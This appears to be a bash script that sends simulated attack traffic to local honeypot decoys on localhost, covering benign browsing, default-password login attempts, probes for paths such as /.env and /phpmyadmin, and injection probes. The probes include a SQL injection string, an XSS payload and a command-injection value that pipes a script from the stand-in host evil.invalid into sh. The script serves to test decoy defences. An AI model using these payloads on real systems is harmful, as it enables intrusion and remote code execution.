#!/usr/bin/env bash
set -euo pipefail

TARGETS=("http://localhost:8081" "http://localhost:8082" "http://localhost:8083")
if [[ "${INCLUDE_BASELINE:-0}" == "1" ]]; then
  TARGETS+=("http://localhost:8090")
fi

wait_for_target() {
  local url="$1"
  local max_attempts="${2:-20}"
  local attempt=1

  while (( attempt <= max_attempts )); do
    if curl --silent --output /dev/null --max-time 3 "${url}/"; then
      return 0
    fi
    sleep 1
    ((attempt++))
  done

  echo "warning: ${url} did not become ready after ${max_attempts}s" >&2
  return 1
}

get_request() {
  local url="$1"
  local path="$2"
  local agent="$3"
  curl --silent --show-error --output /dev/null --max-time 3 \
    -A "${agent}" \
    "${url}${path}" || true
}

post_login() {
  local url="$1"
  local username="$2"
  local password="$3"
  local agent="$4"
  curl --silent --show-error --output /dev/null --max-time 3 \
    -A "${agent}" \
    -X POST \
    -d "username=${username}&password=${password}" \
    "${url}/login" || true
}

echo "==> Waiting for decoys to become reachable"
for target in "${TARGETS[@]}"; do
  wait_for_target "${target}" 25 || true
done

echo "==> Scenario 1: benign browsing"
for target in "${TARGETS[@]}"; do
  get_request "${target}" "/" "Mozilla/5.0 (demo-browser)"
  get_request "${target}" "/login" "Mozilla/5.0 (demo-browser)"
done

echo "==> Scenario 2: brute-force style login attempts"
for target in "${TARGETS[@]}"; do
  post_login "${target}" "admin" "admin" "curl/8.0 brute-demo"
  post_login "${target}" "admin" "admin123" "curl/8.0 brute-demo"
  post_login "${target}" "root" "toor" "curl/8.0 brute-demo"
done

echo "==> Scenario 3: scanner behavior"
for target in "${TARGETS[@]}"; do
  get_request "${target}" "/admin" "Mozilla/5.0 scanner-demo"
  get_request "${target}" "/config" "Mozilla/5.0 scanner-demo"
  get_request "${target}" "/.env" "Mozilla/5.0 scanner-demo"
  get_request "${target}" "/phpmyadmin" "Mozilla/5.0 scanner-demo"
done

echo "==> Scenario 4: injection probes"
for target in "${TARGETS[@]}"; do
  post_login "${target}" "%27%20OR%201%3D1%20--" "letmein" "sqlmap/1.7 demo"
  post_login "${target}" "demo" "%3Cscript%3Ealert(1)%3C%2Fscript%3E" "curl/8.0 xss-demo"
  post_login "${target}" "ops" "curl http://evil.invalid/p.sh | sh" "curl/8.0 cmd-demo"
done

echo "==> Attack simulation complete"
